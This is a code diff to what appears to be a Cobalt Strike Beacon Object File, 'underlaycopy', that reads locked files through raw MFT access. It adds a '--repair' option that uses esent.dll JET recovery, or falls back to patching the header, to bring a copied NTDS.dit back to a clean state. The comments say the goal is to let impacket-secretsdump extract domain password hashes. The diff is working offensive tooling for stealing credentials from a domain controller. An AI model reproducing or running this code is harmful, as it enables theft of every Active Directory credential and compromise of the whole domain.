@@ -29,7 +29,7 @@
  * Required privileges: SeBackupPrivilege (typically Administrators,
  * SYSTEM, or Backup Operators).
  *
- * Win32 APIs: kernel32, advapi32, ntdll (no CRT needed).
+ * Win32 APIs: kernel32, advapi32, ntdll, esent (no CRT needed).
  */
 #include <windows.h>
 #include "beacon_compat.h"
@@ -39,6 +39,32 @@ typedef LONG NTSTATUS;
 #define MFT_RECORD_SIZE 1024
 #define CHUNK_SIZE      (512 * 1024)
 #define MAX_RUNS        256
+
+/* JET (ESE) types — enough to call the repair functions without the
+ * full esent.h header (which MinGW doesn't ship). */
+typedef unsigned long long JET_API_PTR;
+typedef JET_API_PTR        JET_INSTANCE;
+typedef JET_API_PTR        JET_SESID;
+typedef long               JET_ERR;
+
+/* JET system parameter IDs (from esent.h) */
+#define JET_paramSystemPath         0
+#define JET_paramTempPath           1
+#define JET_paramLogFilePath        2
+#define JET_paramBaseName           3
+#define JET_paramMaxOpenTables      6
+#define JET_paramCircularLog        17
+#define JET_paramRecovery           34
+#define JET_paramDatabasePageSize   64
+
+/* JET_GRBIT flags */
+#define JET_bitTermComplete         0x00000001
+#define JET_bitTermDirty            0x00000008
+#define JET_bitDbDeleteCorruptIndexes 0x00000010
+
+/* JET error codes */
+#define JET_errDatabaseDirtyShutdown (-550)
+#define JET_errSuccess               0
 
 /* ─── Imports ─────────────────────────────────────────────────────── */
 
@@ -58,6 +84,18 @@ DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
 DECLSPEC_IMPORT int      WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
 DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$GetLastError(VOID);
 DECLSPEC_IMPORT DWORD    WINAPI KERNEL32$SetFilePointer(HANDLE, LONG, PLONG, DWORD);
+
+/* esent.dll — ESE database engine (present on every Windows since XP).
+ * Used to repair NTDS.dit after raw MFT copy leaves it in dirty
+ * shutdown state. */
+DECLSPEC_IMPORT JET_ERR __stdcall ESENT$JetCreateInstance2W(JET_INSTANCE*, const wchar_t*, const wchar_t*, unsigned long);
+DECLSPEC_IMPORT JET_ERR __stdcall ESENT$JetSetSystemParameterW(JET_INSTANCE*, JET_SESID, unsigned long, JET_API_PTR, const wchar_t*);
+DECLSPEC_IMPORT JET_ERR __stdcall ESENT$JetInit(JET_INSTANCE*);
+DECLSPEC_IMPORT JET_ERR __stdcall ESENT$JetBeginSessionW(JET_INSTANCE, JET_SESID*, const wchar_t*, const wchar_t*);
+DECLSPEC_IMPORT JET_ERR __stdcall ESENT$JetAttachDatabase2W(JET_SESID, const wchar_t*, unsigned long, unsigned long);
+DECLSPEC_IMPORT JET_ERR __stdcall ESENT$JetDetachDatabase2W(JET_SESID, const wchar_t*, unsigned long);
+DECLSPEC_IMPORT JET_ERR __stdcall ESENT$JetEndSession(JET_SESID, unsigned long);
+DECLSPEC_IMPORT JET_ERR __stdcall ESENT$JetTerm2(JET_INSTANCE, unsigned long);
 
 /* ─── Helpers ─────────────────────────────────────────────────────── */
 
@@ -174,6 +212,167 @@ static BOOL ApplyUSAFixup(BYTE *record, DWORD recordSize, WORD sectorSize)
     return TRUE;
 }
 
+/* ─── ESE repair ─────────────────────────────────────────────────── */
+
+/* Detect ESE page size from the database header (offset 0xEC in page 0).
+ * Falls back to 8192 if the file can't be read. */
+static DWORD DetectEsePageSize(const wchar_t *dbPath)
+{
+    HANDLE h = KERNEL32$CreateFileW(dbPath, GENERIC_READ,
+        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+    if (h == INVALID_HANDLE_VALUE) return 8192;
+    BYTE hdr[256] = {0};
+    DWORD rd = 0;
+    KERNEL32$ReadFile(h, hdr, 256, &rd, NULL);
+    KERNEL32$CloseHandle(h);
+    if (rd < 0xF0) return 8192;
+    DWORD pgSz = (DWORD)(hdr[0xEC] | (hdr[0xED] << 8) |
+                          (hdr[0xEE] << 16) | (hdr[0xEF] << 24));
+    /* Sanity: valid ESE page sizes are 4096, 8192, 16384, 32768. */
+    if (pgSz != 4096 && pgSz != 8192 && pgSz != 16384 && pgSz != 32768)
+        pgSz = 8192;
+    return pgSz;
+}
+
+/* Repair a dirty ESE database (.dit / .edb) in-process via esent.dll.
+ *
+ * NTDS.dit is always in "dirty shutdown" state when copied from a live
+ * DC because AD hasn't flushed its transaction logs.  Without repair,
+ * offline parsers like impacket-secretsdump fail with index errors.
+ *
+ * Strategy (two-phase):
+ *   Phase 1 — JET recovery:
+ *     Create a JET instance with recovery ON, circular logging, and
+ *     log/checkpoint paths pointing to the copied database's directory.
+ *     JetAttachDatabase2W triggers the engine to create new recovery
+ *     logs and bring the database to clean shutdown state.
+ *   Phase 2 — header patch (fallback):
+ *     If JET recovery fails (missing log generation, version mismatch,
+ *     etc.), directly patch the ESE header's dbstate DWORD at offset
+ *     0xD4 from DirtyShutdown (2) to CleanShutdown (3).  This lets
+ *     offline parsers proceed; uncommitted pages may cause sporadic
+ *     errors on individual records but the bulk of hashes will parse. */
+static void RepairEseDatabase(const wchar_t *dbPath, HANDLE heap)
+{
+    DWORD pgSz = DetectEsePageSize(dbPath);
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] ESE page size: %lu", pgSz);
+
+    JET_INSTANCE inst = 0;
+    JET_SESID    ses  = 0;
+    JET_ERR      err;
+
+    /* Build a temp path for recovery logs: same directory as the
+     * database file.  E.g.  C:\ntds.bin  →  C:\ */
+    wchar_t logPath[512] = {0};
+    int pathLen = 0;
+    for (int i = 0; dbPath[i]; i++) pathLen = i + 1;
+    /* Copy full path, then truncate after last backslash. */
+    for (int i = 0; i < pathLen && i < 510; i++) logPath[i] = dbPath[i];
+    for (int i = pathLen - 1; i >= 0; i--) {
+        if (logPath[i] == L'\\' || logPath[i] == L'/') {
+            logPath[i + 1] = L'\0';
+            break;
+        }
+    }
+
+    /* Instance name — just needs to be unique. */
+    wchar_t instName[] = {L'u',L'l',L'c',L'r',L'e',L'p',L'\0'};
+    err = ESENT$JetCreateInstance2W(&inst, instName, NULL, 0);
+    if (err != JET_errSuccess) {
+        BeaconPrintf(CALLBACK_ERROR,
+            "[-] JetCreateInstance2W: %ld", err);
+        return;
+    }
+
+    /* Page size MUST match the database — set before JetInit. */
+    ESENT$JetSetSystemParameterW(&inst, 0, JET_paramDatabasePageSize,
+                                  (JET_API_PTR)pgSz, NULL);
+
+    /* Point recovery logs/checkpoint to the same directory as the
+     * copied database so we don't touch the live AD log path. */
+    ESENT$JetSetSystemParameterW(&inst, 0, JET_paramSystemPath,   0, logPath);
+    ESENT$JetSetSystemParameterW(&inst, 0, JET_paramTempPath,     0, logPath);
+    ESENT$JetSetSystemParameterW(&inst, 0, JET_paramLogFilePath,  0, logPath);
+
+    /* Base name "edb" matches the log files NTDS.dit expects
+     * (edb.log, edb00001.log, edb.chk, etc.). */
+    wchar_t baseName[] = {L'e',L'd',L'b',L'\0'};
+    ESENT$JetSetSystemParameterW(&inst, 0, JET_paramBaseName, 0, baseName);
+
+    /* Enable recovery so the engine can replay/create logs to fix the
+     * dirty shutdown state.  The logs go to our temp directory, not
+     * the live AD path. */
+    wchar_t recOn[] = {L'o',L'n',L'\0'};
+    ESENT$JetSetSystemParameterW(&inst, 0, JET_paramRecovery, 0, recOn);
+
+    /* Circular logging: engine creates new log files instead of failing
+     * when the expected sequential log generation doesn't exist. */
+    ESENT$JetSetSystemParameterW(&inst, 0, JET_paramCircularLog, 1, NULL);
+
+    ESENT$JetSetSystemParameterW(&inst, 0, JET_paramMaxOpenTables, 1000, NULL);
+
+    err = ESENT$JetInit(&inst);
+    if (err != JET_errSuccess) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] JetInit: %ld", err);
+        ESENT$JetTerm2(inst, JET_bitTermComplete);
+        return;
+    }
+
+    err = ESENT$JetBeginSessionW(inst, &ses, NULL, NULL);
+    if (err != JET_errSuccess) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] JetBeginSession: %ld", err);
+        ESENT$JetTerm2(inst, JET_bitTermComplete);
+        return;
+    }
+
+    /* Attach — the engine will create recovery logs in logPath and
+     * bring the database to a clean shutdown state. */
+    err = ESENT$JetAttachDatabase2W(ses, dbPath, 0, 0);
+    if (err == JET_errSuccess) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] ESE attach OK — database repaired");
+        ESENT$JetDetachDatabase2W(ses, dbPath, 0);
+    } else {
+        BeaconPrintf(CALLBACK_ERROR,
+            "[-] JetAttachDatabase2W: %ld — trying header patch fallback", err);
+    }
+
+    ESENT$JetEndSession(ses, 0);
+    ESENT$JetTerm2(inst, JET_bitTermComplete);
+
+    /* Fallback: if JET recovery failed (e.g. missing log files), directly
+     * patch the database header's dbstate from DirtyShutdown (2) to
+     * CleanShutdown (3).  This is the same trick esentutl uses internally.
+     * Offset 0xD4 in the ESE header holds the JET_dbstate DWORD. */
+    if (err != JET_errSuccess) {
+        HANDLE hDb = KERNEL32$CreateFileW(dbPath,
+            GENERIC_READ | GENERIC_WRITE,
+            0, NULL, OPEN_EXISTING, 0, NULL);
+        if (hDb != INVALID_HANDLE_VALUE) {
+            BYTE hdr[256] = {0};
+            DWORD rd = 0;
+            KERNEL32$ReadFile(hDb, hdr, 256, &rd, NULL);
+            if (rd >= 0xD8) {
+                DWORD dbState = (DWORD)(hdr[0xD4] | (hdr[0xD5] << 8) |
+                                        (hdr[0xD6] << 16) | (hdr[0xD7] << 24));
+                BeaconPrintf(CALLBACK_OUTPUT,
+                    "[*] current dbstate: %lu (2=dirty, 3=clean)", dbState);
+                if (dbState == 2) {
+                    /* Set to CleanShutdown (3). */
+                    hdr[0xD4] = 3; hdr[0xD5] = 0;
+                    hdr[0xD6] = 0; hdr[0xD7] = 0;
+                    LONG zero = 0;
+                    KERNEL32$SetFilePointer(hDb, 0, &zero, FILE_BEGIN);
+                    DWORD wr = 0;
+                    KERNEL32$WriteFile(hDb, hdr, 256, &wr, NULL);
+                    BeaconPrintf(CALLBACK_OUTPUT,
+                        "[+] patched dbstate 2 -> 3 (clean shutdown)");
+                }
+            }
+            KERNEL32$CloseHandle(hDb);
+        }
+    }
+}
+
 /* Build the raw volume path L"\\.\<drive>:" for CreateFileW. */
 static void BuildVolumePath(char drive, wchar_t out[7])
 {
@@ -198,10 +397,11 @@ void go(char *args, int len)
     char *srcA   = BeaconDataExtract(&parser, NULL);
     char *dstA   = BeaconDataExtract(&parser, NULL);
     char *volA   = BeaconDataExtract(&parser, NULL);
+    int   repair = BeaconDataInt(&parser);
 
     if (!srcA || !dstA || !srcA[0] || !dstA[0]) {
         BeaconPrintf(CALLBACK_ERROR,
-            "[-] usage: underlaycopy --src <path> --dst <path> [--volume C]");
+            "[-] usage: underlaycopy --src <path> --dst <path> [--volume C] [--repair 1]");
         return;
     }
     char volDrive = (volA && volA[0]) ? volA[0] : 'C';
@@ -457,6 +657,19 @@ void go(char *args, int len)
         BeaconPrintf(CALLBACK_OUTPUT, "[+] done — %lld bytes -> %s", fsize, dstA);
     else
         BeaconPrintf(CALLBACK_ERROR,  "[-] copy incomplete");
+
+    /* 10. Optional ESE repair — NTDS.dit copied from a live DC is always
+     *     in dirty shutdown state.  Use esent.dll to attach+detach which
+     *     replays/creates recovery logs and brings it to clean state. */
+    if (ok && repair) {
+        /* Close dst handle first — esent needs exclusive access. */
+        if (hDst != INVALID_HANDLE_VALUE) {
+            KERNEL32$CloseHandle(hDst);
+            hDst = INVALID_HANDLE_VALUE;
+        }
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] repairing ESE database...");
+        RepairEseDatabase(dstW, heap);
+    }
 
 cleanup:
     if (hDst    != INVALID_HANDLE_VALUE) KERNEL32$CloseHandle(hDst);
